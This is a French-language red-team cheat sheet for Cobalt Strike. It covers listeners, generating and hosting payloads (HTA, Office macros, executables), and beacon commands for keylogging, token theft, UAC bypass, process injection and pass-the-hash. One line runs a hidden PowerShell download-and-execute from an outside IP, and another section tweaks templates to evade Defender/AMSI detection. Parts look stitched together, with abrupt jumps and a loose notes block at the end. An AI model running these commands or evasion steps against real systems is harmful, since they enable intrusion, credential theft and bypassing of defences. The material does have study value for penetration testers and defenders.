# Cobalt Strike

### Listeners

### Écouteurs C2

`Cobalt Strike -> Listeners -> Ajouter/Modifier` puis vous pouvez sélectionner où écouter, quel type de beacon utiliser (http, dns, smb...) et plus encore.

### Écouteurs Peer2Peer

Les beacons de ces écouteurs n'ont pas besoin de communiquer directement avec le C2, ils peuvent communiquer avec lui via d'autres beacons.

`Cobalt Strike -> Listeners -> Ajouter/Modifier` puis vous devez sélectionner les beacons TCP ou SMB

* Le **beacon TCP va définir un écouteur sur le port sélectionné**. Pour se connecter à un beacon TCP, utilisez la commande `connect <ip> <port>` depuis un autre beacon
* Le **beacon smb va écouter dans un pipename avec le nom sélectionné**. Pour vous connecter à un beacon SMB, vous devez utiliser la commande `link [target] [pipe]`.

### Générer et héberger des payloads

#### Générer des payloads dans des fichiers

`Attaques -> Packages ->`&#x20;

* **`HTMLApplication`** pour les fichiers HTA
* **`Macro MS Office`** pour un document office avec une macro
* **`Exécutable Windows`** pour un .exe, .dll ou service .exe
* **`Exécutable Windows (S)`** pour un **stageless** .exe, .dll ou service .exe (mieux vaut stageless que staged, moins d'IoC)

#### Générer et héberger des payloads

`Attaques -> Web Drive-by -> Scripted Web Delivery (S)` Cela générera un script/exécutable pour télécharger le beacon de cobalt strike dans des formats tels que: bitsadmin, exe, powershell et python

#### Héberger des payloads

Si vous avez déjà le fichier que vous voulez héberger dans un serveur web, allez simplement à `Attaques -> Web Drive-by -> Host File` et sélectionnez le fichier à héberger et la configuration du serveur web.

### Options de Beacon

<pre class="language-bash"><code class="lang-bash"># Exécuter un binaire .NET local
execute-assembly &#x3C;/path/to/executable.exe>

# Captures d'écran
printscreen    # Prendre une capture d'écran unique via la méthode PrintScr
screenshot     # Prendre une capture d'écran unique
screenwatch    # Prendre des captures d'écran périodiques du bureau
## Aller dans Affichage -> Captures d'écran pour les voir

# keylogger
keylogger [pid] [x86|x64]
## Afficher > Frappes de clavier pour voir les touches pressées

# portscan
portscan [pid] [arch] [cibles] [ports] [arp|icmp|none] [max connections] # Injecter une action de portscan dans un autre processus
portscan [cibles] [ports] [arp|icmp|none] [max connections]

# Powershell
# Importer un module Powershell
powershell-import C:\path\to\PowerView.ps1
powershell &#x3C;just write powershell cmd here>

# Impersonation d'utilisateur
## Génération de jeton avec des informations d'identification
make_token [DOMAIN\user] [password] #Créer un jeton pour se faire passer pour un utilisateur dans le réseau
ls \\computer_name\c$ # Essayer d'utiliser le jeton généré pour accéder à C$ sur un ordinateur
rev2self # Arrêter d'utiliser le jeton généré avec make_token
## L'utilisation de make_token génère l'événement 4624: Une session a été ouverte pour un compte. Cet événement est très courant dans un domaine Windows, mais peut être affiné en filtrant sur le type de connexion. Comme mentionné ci-dessus, il utilise LOGON32_LOGON_NEW_CREDENTIALS qui est de type 9.

# Contournement de l'UAC
elevate svc-exe &#x3C;listener>
elevate uac-token-duplication &#x3C;listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Voler le jeton d'un pid
## Comme make_token mais en volant le jeton d'un processus
steal_token [pid] # Aussi, cela est utile pour les actions réseau, pas pour les actions locales
## À partir de la documentation de l'API, nous savons que ce type de connexion "permet à l'appelant de cloner son jeton actuel". C'est pourquoi la sortie de Beacon dit Impersonated &#x3C;current_username> - il se fait passer pour notre propre jeton cloné.
ls \\computer_name\c$ # Essayer d'utiliser le jeton généré pour accéder à C$ sur un ordinateur
rev2self # Arrêter d'utiliser le jeton volé avec steal_token

## Lancer un processus avec de nouvelles informations d'identification
spawnas [domain\username] [password] [listener] #Faites-le à partir d'un répertoire avec un accès en lecture comme: cd C:\
## Comme make_token, cela générera l'événement Windows 4624: Une session a été ouverte pour un compte, mais avec un type de connexion de 2 (LOGON32_LOGON_INTERACTIVE). Il détaillera l'utilisateur appelant (TargetUserName) et l'utilisateur usurpé (TargetOutboundUserName).

## Injecter dans un processus
inject [pid] [x64|x86] [listener]
## D'un point de vue OpSec: ne pas effectuer d'injection interplateforme à moins que vous n'en ayez vraiment besoin (par exemple, x86 -> x64 ou x64 -> x86).

## Passer le hash
## Cette modification nécessite le patching de la mémoire LSASS, ce qui est une action à haut risque, nécessite des privilèges d'administrateur local et n'est pas viable si Protected Process Light (PPL) est activé.
pth [pid]
```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```
N'oubliez pas de charger le script agressif `dist-pipe\artifact.cna` pour indiquer à Cobalt Strike d'utiliser les ressources du disque que nous voulons et non celles chargées.

### Kit de ressources

Le dossier ResourceKit contient les modèles pour les charges utiles basées sur des scripts de Cobalt Strike, y compris PowerShell, VBA et HTA.

En utilisant [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) avec les modèles, vous pouvez trouver ce que Defender (AMSI dans ce cas) n'aime pas et le modifier :
```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```
Modifiant les lignes détectées, on peut générer un modèle qui ne sera pas détecté.

N'oubliez pas de charger le script agressif `ResourceKit\resources.cna` pour indiquer à Cobalt Strike d'utiliser les ressources du disque que nous voulons et non celles chargées.
```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

